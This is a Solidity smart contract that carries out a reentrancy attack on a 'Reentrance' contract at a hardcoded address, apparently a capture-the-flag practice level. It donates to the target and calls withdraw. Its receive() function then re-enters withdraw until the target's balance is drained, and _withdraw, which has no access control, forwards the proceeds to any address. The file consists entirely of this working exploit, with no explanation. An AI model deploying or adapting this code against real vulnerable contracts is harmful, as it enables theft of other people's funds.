// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Reentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract HReentrance {
    Reentrance private reentrance =
        Reentrance(0xeAdE8A6122E4293860e39E36594503055ecDe183);
    uint256 public amount;

    constructor() public payable {
        amount = address(this).balance;
    }

    function hDonate() public {
        reentrance.donate.value(amount)(address(this));
    }

    function HWithdraw() public {
        reentrance.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }

    function _withdraw(address payable _to) public {
        _to.transfer(address(this).balance);
    }
}
